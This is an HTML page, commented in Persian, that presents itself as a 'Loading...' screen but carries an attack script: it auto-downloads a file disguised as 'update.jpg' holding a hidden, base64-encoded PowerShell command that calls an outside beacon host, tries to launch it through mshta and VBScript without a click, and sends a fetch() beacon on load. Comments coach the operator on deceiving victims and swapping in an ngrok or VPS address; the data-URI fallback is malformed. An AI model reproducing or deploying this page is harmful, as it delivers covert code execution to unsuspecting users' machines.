<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Loading...</title>
</head>
<body>
  <h1>در حال بارگذاری...</h1>

  <!-- PowerShell Beacon مخفی + HTML Smuggling -->
  <script>
    // آدرس کلاویاتورت رو اینجا بذار (مثلاً Ngrok یا سرور VPS خودت)
    const BEACON_URL = "https://beacon-tanahmaj.takhti-iran.me"; // <-- عوض کن

    // PowerShell تک‌خطی که فقط یه GET خالی می‌زنه
    const psCommand = `
      try {
        \$wc = New-Object System.Net.WebClient;
        \$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        \$wc.DownloadString('${BEACON_URL}?t=' + [DateTime]::UtcNow.Ticks);
      } catch {}
    `.replace(/\n/g, '').trim();

    // کد رو Base64 می‌کنیم (برای smuggling)
    const b64 = btoa(unescape(encodeURIComponent(psCommand)));

    // Blob می‌سازیم و مستقیم با mshta یا PowerShell اجرا می‌کنیم
    const payload = `powershell.exe -nop -w hidden -enc ${b64}`;

    const blob = new Blob([payload], {type: 'application/octet-stream'});
    const url = URL.createObjectURL(blob);

    // دانلود خودکار با اسم فریب کاربر (یا کاملاً مخفی)
    const a = document.createElement('a');
    a.href = url;
    a.download = 'update.jpg'; // یا هر اسمی که بخوای (حتی .jpg کار می‌کنه چون ویندوز به پسوند نگاه می‌کنه نه محتوا)
    document.body.appendChild(a);
    a.click();

    // اگر کاربر روی فایل کلیک نکنه، با mshta مستقیم اجرا می‌کنیم (بدون نیاز به کلیک!)
    setTimeout(() => {
      try {
        location = "mshta.exe vbscript:Execute(\"CreateObject\"\"WScript.Shell\"\").Run\"\"${payload}\"\",0,False:window.close()\")";
      } catch(e) {
        // fallback: با data URI + hta
        location = `data:text/html;base64,PHNjcmlwdD5uZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAi${b64PS}\",MDwvscript+>`;
      }
    }, 1500);

    // یه beacon ساده با fetch هم بزن که مطمئن شی حتی بدون کلیک هم برسه
    fetch(BEACON_URL + '?stage=js');
  </script>

  <!-- برای اینکه صفحه خالی نباشه و Render بلاک نکنه -->
  <div style="display:none"></div>
</body>
</html>
